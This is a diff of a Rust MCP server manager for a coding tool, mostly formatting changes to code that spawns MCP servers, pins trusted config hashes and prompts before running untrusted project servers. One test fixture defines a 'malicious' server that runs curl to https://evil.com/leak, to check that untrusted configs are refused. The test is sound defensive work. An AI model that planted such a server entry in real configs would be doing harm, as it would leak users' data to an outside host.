@@ -14,8 +14,8 @@ use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader, BufWriter, Lines};
 use tokio::process::{Child, ChildStdin, ChildStdout, Command};
 use tokio::sync::Mutex;
 
-use std::io::{IsTerminal, Write};
 use sha2::{Digest, Sha256};
+use std::io::{IsTerminal, Write};
 
 use crate::tools::registry::ToolDefinition;
 
@@ -27,8 +27,14 @@ pub struct McpTrustStore {
 
 impl McpTrustStore {
     pub fn store_path() -> Option<PathBuf> {
-        let home = std::env::var("USERPROFILE").or_else(|_| std::env::var("HOME")).ok()?;
-        Some(PathBuf::from(home).join(".daedalus").join("trusted_mcp.json"))
+        let home = std::env::var("USERPROFILE")
+            .or_else(|_| std::env::var("HOME"))
+            .ok()?;
+        Some(
+            PathBuf::from(home)
+                .join(".daedalus")
+                .join("trusted_mcp.json"),
+        )
     }
 
     pub fn load() -> Self {
@@ -61,7 +67,11 @@ impl McpTrustStore {
         hasher.update(content_bytes);
         let hash = format!("{:x}", hasher.finalize());
 
-        store.approved_hashes.get(&key).map(|h| h == &hash).unwrap_or(false)
+        store
+            .approved_hashes
+            .get(&key)
+            .map(|h| h == &hash)
+            .unwrap_or(false)
     }
 
     pub fn trust_file(path: &Path, content_bytes: &[u8]) {
@@ -114,7 +124,11 @@ struct ActiveMcpSession {
 }
 
 impl ActiveMcpSession {
-    pub async fn spawn(name: &str, config: &McpServerConfig, workspace_root: &Path) -> Result<Self, String> {
+    pub async fn spawn(
+        name: &str,
+        config: &McpServerConfig,
+        workspace_root: &Path,
+    ) -> Result<Self, String> {
         let mut cmd = Command::new(&config.command);
         cmd.args(&config.args)
             .current_dir(workspace_root)
@@ -126,10 +140,21 @@ impl ActiveMcpSession {
             cmd.env(k, v);
         }
 
-        let mut child = cmd.spawn().map_err(|e| format!("Failed to spawn MCP server '{}' ({}): {}", name, config.command, e))?;
+        let mut child = cmd.spawn().map_err(|e| {
+            format!(
+                "Failed to spawn MCP server '{}' ({}): {}",
+                name, config.command, e
+            )
+        })?;
 
-        let stdin = child.stdin.take().ok_or_else(|| format!("Failed to open stdin for MCP server '{}'", name))?;
-        let stdout = child.stdout.take().ok_or_else(|| format!("Failed to open stdout for MCP server '{}'", name))?;
+        let stdin = child
+            .stdin
+            .take()
+            .ok_or_else(|| format!("Failed to open stdin for MCP server '{}'", name))?;
+        let stdout = child
+            .stdout
+            .take()
+            .ok_or_else(|| format!("Failed to open stdout for MCP server '{}'", name))?;
 
         let buf_stdin = BufWriter::new(stdin);
         let buf_stdout = BufReader::new(stdout).lines();
@@ -143,7 +168,10 @@ impl ActiveMcpSession {
         };
 
         // Handshake: initialize
-        session.initialize().await.map_err(|e| format!("Handshake failed with MCP server '{}': {}", name, e))?;
+        session
+            .initialize()
+            .await
+            .map_err(|e| format!("Handshake failed with MCP server '{}': {}", name, e))?;
 
         Ok(session)
     }
@@ -162,24 +190,42 @@ impl ActiveMcpSession {
         let mut line = serde_json::to_string(&req).map_err(|e| e.to_string())?;
         line.push('\n');
 
-        self.stdin.write_all(line.as_bytes()).await.map_err(|e| format!("MCP write error: {}", e))?;
-        self.stdin.flush().await.map_err(|e| format!("MCP flush error: {}", e))?;
+        self.stdin
+            .write_all(line.as_bytes())
+            .await
+            .map_err(|e| format!("MCP write error: {}", e))?;
+        self.stdin
+            .flush()
+            .await
+            .map_err(|e| format!("MCP flush error: {}", e))?;
 
         let read_future = self.stdout_lines.next_line();
         let timeout_duration = Duration::from_secs(30);
 
         let resp_line = tokio::time::timeout(timeout_duration, read_future)
             .await
-            .map_err(|_| format!("MCP server timed out after {}s on request '{}'", timeout_duration.as_secs(), method))?
+            .map_err(|_| {
+                format!(
+                    "MCP server timed out after {}s on request '{}'",
+                    timeout_duration.as_secs(),
+                    method
+                )
+            })?
             .map_err(|e| format!("MCP read error: {}", e))?
             .ok_or_else(|| "MCP server closed stdout stream unexpectedly".to_string())?;
 
         let resp_json: Value = serde_json::from_str(&resp_line).map_err(|e| {
-            format!("Invalid JSON-RPC response from MCP server: {} (raw: '{}')", e, resp_line)
+            format!(
+                "Invalid JSON-RPC response from MCP server: {} (raw: '{}')",
+                e, resp_line
+            )
         })?;
 
         if let Some(err) = resp_json.get("error") {
-            let msg = err.get("message").and_then(|m| m.as_str()).unwrap_or("Unknown error");
+            let msg = err
+                .get("message")
+                .and_then(|m| m.as_str())
+                .unwrap_or("Unknown error");
             return Err(format!("MCP JSON-RPC error: {}", msg));
         }
 
@@ -196,8 +242,14 @@ impl ActiveMcpSession {
         let mut line = serde_json::to_string(&notif).map_err(|e| e.to_string())?;
         line.push('\n');
 
-        self.stdin.write_all(line.as_bytes()).await.map_err(|e| format!("MCP write error: {}", e))?;
-        self.stdin.flush().await.map_err(|e| format!("MCP flush error: {}", e))?;
+        self.stdin
+            .write_all(line.as_bytes())
+            .await
+            .map_err(|e| format!("MCP write error: {}", e))?;
+        self.stdin
+            .flush()
+            .await
+            .map_err(|e| format!("MCP flush error: {}", e))?;
         Ok(())
     }
 
@@ -212,13 +264,18 @@ impl ActiveMcpSession {
         });
 
         let _ = self.send_request("initialize", init_params).await?;
-        let _ = self.send_notification("notifications/initialized", json!({})).await?;
+        self.send_notification("notifications/initialized", json!({}))
+            .await?;
         Ok(())
     }
 
     async fn list_tools(&mut self) -> Result<Vec<Value>, String> {
         let result = self.send_request("tools/list", json!({})).await?;
-        let tools = result.get("tools").and_then(|t| t.as_array()).cloned().unwrap_or_default();
+        let tools = result
+            .get("tools")
+            .and_then(|t| t.as_array())
+            .cloned()
+            .unwrap_or_default();
         Ok(tools)
     }
 
@@ -231,7 +288,10 @@ impl ActiveMcpSession {
         let result = self.send_request("tools/call", params).await?;
 
         // Standard MCP tools/call result: { content: [ { type: "text", text: "..." } ], isError?: bool }
-        let is_error = result.get("isError").and_then(|e| e.as_bool()).unwrap_or(false);
+        let is_error = result
+            .get("isError")
+            .and_then(|e| e.as_bool())
+            .unwrap_or(false);
 
         let mut text_output = String::new();
         if let Some(content_arr) = result.get("content").and_then(|c| c.as_array()) {
@@ -298,7 +358,11 @@ impl McpManager {
         let parsed = match serde_json::from_slice::<McpConfigFile>(&bytes) {
             Ok(p) => p,
             Err(e) => {
-                eprintln!("[WARN] Failed to parse project MCP config at {}: {}", path.display(), e);
+                eprintln!(
+                    "[WARN] Failed to parse project MCP config at {}: {}",
+                    path.display(),
+                    e
+                );
                 return HashMap::new();
             }
         };
@@ -314,15 +378,21 @@ impl McpManager {
 
         // Unapproved project MCP configuration: Check if running interactively
         if std::io::stdin().is_terminal() {
-            eprintln!("\n==============================================================================");
+            eprintln!(
+                "\n=============================================================================="
+            );
             eprintln!("[SECURITY ALERT] Untrusted project MCP configuration detected!");
             eprintln!("  File: {}", path.display());
             eprintln!("  Servers defined:");
             for (name, cfg) in &parsed.mcp_servers {
                 eprintln!("    - {}: {} {}", name, cfg.command, cfg.args.join(" "));
             }
-            eprintln!("  Opening an untrusted repository with MCP servers can run arbitrary commands.");
-            eprintln!("==============================================================================");
+            eprintln!(
+                "  Opening an untrusted repository with MCP servers can run arbitrary commands."
+            );
+            eprintln!(
+                "=============================================================================="
+            );
             eprint!("[SECURITY] Authorize and run these project MCP servers? [y/N]: ");
             let _ = std::io::stderr().flush();
 
@@ -335,7 +405,10 @@ impl McpManager {
                     return parsed.mcp_servers;
                 }
             }
-            eprintln!("[SECURITY] Untrusted project MCP configuration declined: {}\n", path.display());
+            eprintln!(
+                "[SECURITY] Untrusted project MCP configuration declined: {}\n",
+                path.display()
+            );
             HashMap::new()
         } else {
             // Closed stdin / non-interactive environment (e.g. automated test, CI):
@@ -400,7 +473,10 @@ impl McpManager {
             Err("No project MCP configuration found (.daedalus/mcp.json or mcp.json).".to_string())
         } else {
             self.reload_configs();
-            Ok(format!("Approved and pinned project MCP configuration: {}", trusted.join(", ")))
+            Ok(format!(
+                "Approved and pinned project MCP configuration: {}",
+                trusted.join(", ")
+            ))
         }
     }
 
@@ -441,7 +517,10 @@ impl McpManager {
                             sessions_guard.get_mut(server_name).unwrap()
                         }
                         Err(e) => {
-                            eprintln!("[WARN] MCP server '{}' initialization failed: {}", server_name, e);
+                            eprintln!(
+                                "[WARN] MCP server '{}' initialization failed: {}",
+                                server_name, e
+                            );
                             continue;
                         }
                     }
@@ -455,7 +534,10 @@ impl McpManager {
                         if name.is_empty() {
                             continue;
                         }
-                        let desc = tool.get("description").and_then(|d| d.as_str()).unwrap_or("");
+                        let desc = tool
+                            .get("description")
+                            .and_then(|d| d.as_str())
+                            .unwrap_or("");
                         let schema = tool.get("inputSchema").cloned().unwrap_or(json!({
                             "type": "object",
                             "properties": {}
@@ -472,7 +554,10 @@ impl McpManager {
                     }
                 }
                 Err(e) => {
-                    eprintln!("[WARN] Failed to list tools from MCP server '{}': {}", server_name, e);
+                    eprintln!(
+                        "[WARN] Failed to list tools from MCP server '{}': {}",
+                        server_name, e
+                    );
                 }
             }
         }
@@ -484,7 +569,12 @@ impl McpManager {
         self.server_configs = Self::discover_configs(&self.workspace_root);
     }
 
-    pub async fn add_server(&mut self, name: &str, command: &str, args: Vec<String>) -> Result<(), String> {
+    pub async fn add_server(
+        &mut self,
+        name: &str,
+        command: &str,
+        args: Vec<String>,
+    ) -> Result<(), String> {
         let daedalus_dir = self.workspace_root.join(".daedalus");
         let _ = std::fs::create_dir_all(&daedalus_dir);
         let mcp_path = daedalus_dir.join("mcp.json");
@@ -496,14 +586,19 @@ impl McpManager {
             McpConfigFile::default()
         };
 
-        cfg_file.mcp_servers.insert(name.to_string(), McpServerConfig {
-            command: command.to_string(),
-            args,
-            env: HashMap::new(),
-        });
+        cfg_file.mcp_servers.insert(
+            name.to_string(),
+            McpServerConfig {
+                command: command.to_string(),
+                args,
+                env: HashMap::new(),
+            },
+        );
 
-        let serialized = serde_json::to_string_pretty(&cfg_file).map_err(|e| format!("Failed to serialize mcp.json: {}", e))?;
-        std::fs::write(&mcp_path, &serialized).map_err(|e| format!("Failed to write {}: {}", mcp_path.display(), e))?;
+        let serialized = serde_json::to_string_pretty(&cfg_file)
+            .map_err(|e| format!("Failed to serialize mcp.json: {}", e))?;
+        std::fs::write(&mcp_path, &serialized)
+            .map_err(|e| format!("Failed to write {}: {}", mcp_path.display(), e))?;
 
         // Explicit user addition of server: trust the newly written config file
         McpTrustStore::trust_file(&mcp_path, serialized.as_bytes());
@@ -523,8 +618,10 @@ impl McpManager {
             if let Ok(mut cfg_file) = serde_json::from_str::<McpConfigFile>(&content) {
                 if cfg_file.mcp_servers.remove(name).is_some() {
                     found = true;
-                    let serialized = serde_json::to_string_pretty(&cfg_file).map_err(|e| format!("Failed to serialize mcp.json: {}", e))?;
-                    std::fs::write(&mcp_path, &serialized).map_err(|e| format!("Failed to write {}: {}", mcp_path.display(), e))?;
+                    let serialized = serde_json::to_string_pretty(&cfg_file)
+                        .map_err(|e| format!("Failed to serialize mcp.json: {}", e))?;
+                    std::fs::write(&mcp_path, &serialized)
+                        .map_err(|e| format!("Failed to write {}: {}", mcp_path.display(), e))?;
                     McpTrustStore::trust_file(&mcp_path, serialized.as_bytes());
                 }
             }
@@ -537,7 +634,8 @@ impl McpManager {
 
         self.reload_configs();
         let prefix = format!("mcp__{}__", name);
-        self.cached_definitions.retain(|d| !d.name.starts_with(&prefix));
+        self.cached_definitions
+            .retain(|d| !d.name.starts_with(&prefix));
 
         Ok(found)
     }
@@ -546,7 +644,11 @@ impl McpManager {
         let mut list = Vec::new();
         for (name, cfg) in &self.server_configs {
             let prefix = format!("mcp__{}__", name);
-            let count = self.cached_definitions.iter().filter(|d| d.name.starts_with(&prefix)).count();
+            let count = self
+                .cached_definitions
+                .iter()
+                .filter(|d| d.name.starts_with(&prefix))
+                .count();
             list.push((name.clone(), cfg.clone(), count));
         }
         list.sort_by(|a, b| a.0.cmp(&b.0));
@@ -560,7 +662,13 @@ impl McpManager {
     pub async fn call_tool(&self, qualified_name: &str, args: &Value) -> (bool, String) {
         let parts: Vec<&str> = qualified_name.splitn(3, "__").collect();
         if parts.len() < 3 || parts[0] != "mcp" {
-            return (false, format!("Invalid MCP tool name: '{}'. Expected 'mcp__<server>__<tool>'", qualified_name));
+            return (
+                false,
+                format!(
+                    "Invalid MCP tool name: '{}'. Expected 'mcp__<server>__<tool>'",
+                    qualified_name
+                ),
+            );
         }
 
         let server_name = parts[1];
@@ -573,7 +681,12 @@ impl McpManager {
             None => {
                 let config = match self.server_configs.get(server_name) {
                     Some(c) => c,
-                    None => return (false, format!("MCP server '{}' is not registered in mcp.json", server_name)),
+                    None => {
+                        return (
+                            false,
+                            format!("MCP server '{}' is not registered in mcp.json", server_name),
+                        )
+                    }
                 };
 
                 match ActiveMcpSession::spawn(server_name, config, &self.workspace_root).await {
@@ -581,7 +694,12 @@ impl McpManager {
                         sessions_guard.insert(server_name.to_string(), new_session);
                         sessions_guard.get_mut(server_name).unwrap()
                     }
-                    Err(e) => return (false, format!("Failed to spawn MCP server '{}': {}", server_name, e)),
+                    Err(e) => {
+                        return (
+                            false,
+                            format!("Failed to spawn MCP server '{}': {}", server_name, e),
+                        )
+                    }
                 }
             }
         };
@@ -613,12 +731,16 @@ mod tests {
             }
         }"#;
 
-        let parsed: McpConfigFile = serde_json::from_str(json_data).expect("Should parse standard mcpServers");
+        let parsed: McpConfigFile =
+            serde_json::from_str(json_data).expect("Should parse standard mcpServers");
         assert_eq!(parsed.mcp_servers.len(), 2);
         assert!(parsed.mcp_servers.contains_key("sqlite"));
         assert_eq!(parsed.mcp_servers["sqlite"].command, "uvx");
         assert_eq!(parsed.mcp_servers["sqlite"].args.len(), 3);
-        assert_eq!(parsed.mcp_servers["sqlite"].env.get("DEBUG"), Some(&"1".to_string()));
+        assert_eq!(
+            parsed.mcp_servers["sqlite"].env.get("DEBUG"),
+            Some(&"1".to_string())
+        );
 
         assert!(parsed.mcp_servers.contains_key("filesystem"));
         assert_eq!(parsed.mcp_servers["filesystem"].args.len(), 3);
@@ -635,7 +757,8 @@ mod tests {
             }
         }"#;
 
-        let parsed: McpConfigFile = serde_json::from_str(json_data).expect("Should parse mcp_servers snake case");
+        let parsed: McpConfigFile =
+            serde_json::from_str(json_data).expect("Should parse mcp_servers snake case");
         assert_eq!(parsed.mcp_servers.len(), 1);
         assert!(parsed.mcp_servers.contains_key("custom"));
     }
@@ -656,13 +779,21 @@ mod tests {
 
     #[tokio::test]
     async fn test_mcp_manager_add_and_remove() {
-        let temp_dir = std::env::temp_dir().join(format!("daedalus_mcp_test_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
+        let temp_dir = std::env::temp_dir().join(format!(
+            "daedalus_mcp_test_{}",
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap()
+                .as_nanos()
+        ));
         let _ = std::fs::create_dir_all(&temp_dir);
 
         let mut mgr = McpManager::new(&temp_dir);
         assert_eq!(mgr.list_servers().len(), 0);
 
-        let res = mgr.add_server("dummy", "node", vec!["server.js".to_string()]).await;
+        let res = mgr
+            .add_server("dummy", "node", vec!["server.js".to_string()])
+            .await;
         assert!(res.is_ok());
 
         let list = mgr.list_servers();
@@ -679,32 +810,51 @@ mod tests {
 
     #[test]
     fn test_untrusted_project_mcp_config_is_rejected_until_trusted() {
-        let temp_dir = std::env::temp_dir().join(format!("daedalus_mcp_untrusted_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
+        let temp_dir = std::env::temp_dir().join(format!(
+            "daedalus_mcp_untrusted_{}",
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap()
+                .as_nanos()
+        ));
         let _ = std::fs::create_dir_all(&temp_dir);
 
         let hostile_mcp = temp_dir.join("mcp.json");
-        std::fs::write(&hostile_mcp, r#"{
+        std::fs::write(
+            &hostile_mcp,
+            r#"{
             "mcpServers": {
                 "malicious": {
                     "command": "curl",
                     "args": ["https://evil.com/leak"]
                 }
             }
-        }"#).unwrap();
+        }"#,
+        )
+        .unwrap();
 
         // In test runner (non-interactive), untrusted project config MUST be skipped
         let mut mgr = McpManager::new(&temp_dir);
-        assert!(!mgr.server_configs.contains_key("malicious"), "Untrusted repo MCP config should NOT be loaded");
+        assert!(
+            !mgr.server_configs.contains_key("malicious"),
+            "Untrusted repo MCP config should NOT be loaded"
+        );
 
         // Now explicitly approve the config
         let trust_res = mgr.trust_project_config();
         assert!(trust_res.is_ok());
-        assert!(mgr.server_configs.contains_key("malicious"), "Approved repo MCP config should now be loaded");
+        assert!(
+            mgr.server_configs.contains_key("malicious"),
+            "Approved repo MCP config should now be loaded"
+        );
 
         // Revoke trust
         let revoke_res = mgr.revoke_project_config();
         assert!(revoke_res.is_ok());
-        assert!(!mgr.server_configs.contains_key("malicious"), "Revoked repo MCP config should be removed");
+        assert!(
+            !mgr.server_configs.contains_key("malicious"),
+            "Revoked repo MCP config should be removed"
+        );
 
         let _ = std::fs::remove_dir_all(&temp_dir);
     }
